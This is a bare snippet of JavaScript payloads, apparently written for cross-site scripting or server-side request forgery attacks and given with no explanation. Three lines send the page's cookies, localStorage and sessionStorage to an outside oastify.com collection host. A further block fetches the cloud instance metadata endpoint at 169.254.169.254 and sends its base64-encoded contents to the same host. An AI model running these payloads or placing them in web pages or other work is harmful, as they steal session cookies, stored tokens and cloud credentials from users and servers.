fetch('https://e5kfnwbncxnfntbhy5ti0lwx1o7fvfj4.oastify.com/?c=' + document.cookie)
fetch('https://e5kfnwbncxnfntbhy5ti0lwx1o7fvfj4.oastify.com/?ls=' + JSON.stringify(localStorage))
fetch('https://e5kfnwbncxnfntbhy5ti0lwx1o7fvfj4.oastify.com/?ss=' + JSON.stringify(sessionStorage))

fetch('http://169.254.169.254/metadata/v1/')
  .then(r => r.text())
  .then(d => fetch('https://e5kfnwbncxnfntbhy5ti0lwx1o7fvfj4.oastify.com/?data=' + btoa(d)))
